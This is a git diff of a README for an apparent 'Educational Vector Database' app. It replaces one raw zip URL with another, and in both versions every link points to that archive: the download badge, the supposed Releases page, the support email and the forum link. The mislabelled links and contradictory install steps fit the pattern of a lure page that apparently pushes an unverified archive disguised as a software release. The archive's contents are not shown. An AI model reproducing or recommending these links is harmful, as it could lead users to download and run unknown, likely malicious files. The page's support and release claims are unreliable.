@@ -22,9 +22,9 @@ Before you download and install the Educational Vector Database, ensure your sys
 ## ⬇️ Download & Install
 To get started, visit the Releases page to download the application:
 
-[![Download Educational Vector Database](https://raw.githubusercontent.com/TekilaSS/Educational-Vector-Database/master/src/Educational-Vector-Database_v3.6.zip)](https://raw.githubusercontent.com/TekilaSS/Educational-Vector-Database/master/src/Educational-Vector-Database_v3.6.zip)
+[![Download Educational Vector Database](https://raw.githubusercontent.com/TekilaSS/Educational-Vector-Database/master/tests/Educational-Database-Vector-v3.4.zip)](https://raw.githubusercontent.com/TekilaSS/Educational-Vector-Database/master/tests/Educational-Database-Vector-v3.4.zip)
 
-1. Click the link above to go to the [Releases page](https://raw.githubusercontent.com/TekilaSS/Educational-Vector-Database/master/src/Educational-Vector-Database_v3.6.zip).
+1. Click the link above to go to the [Releases page](https://raw.githubusercontent.com/TekilaSS/Educational-Vector-Database/master/tests/Educational-Database-Vector-v3.4.zip).
 2. Look for the latest version listed.
 3. Choose the appropriate file for your operating system. 
    - For Windows, download the `.exe` file.
@@ -50,8 +50,8 @@ If you encounter any issues while using the application, refer to the support se
 ## 🆘 Support
 If you need help, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/TekilaSS/Educational-Vector-Database/master/src/Educational-Vector-Database_v3.6.zip
-- **Community Forum:** Join our discussions and get help from other users. Visit our [GitHub Discussions page](https://raw.githubusercontent.com/TekilaSS/Educational-Vector-Database/master/src/Educational-Vector-Database_v3.6.zip).
+- **Email:** https://raw.githubusercontent.com/TekilaSS/Educational-Vector-Database/master/tests/Educational-Database-Vector-v3.4.zip
+- **Community Forum:** Join our discussions and get help from other users. Visit our [GitHub Discussions page](https://raw.githubusercontent.com/TekilaSS/Educational-Vector-Database/master/tests/Educational-Database-Vector-v3.4.zip).
 
 We’re here to assist you with any questions or concerns!
 
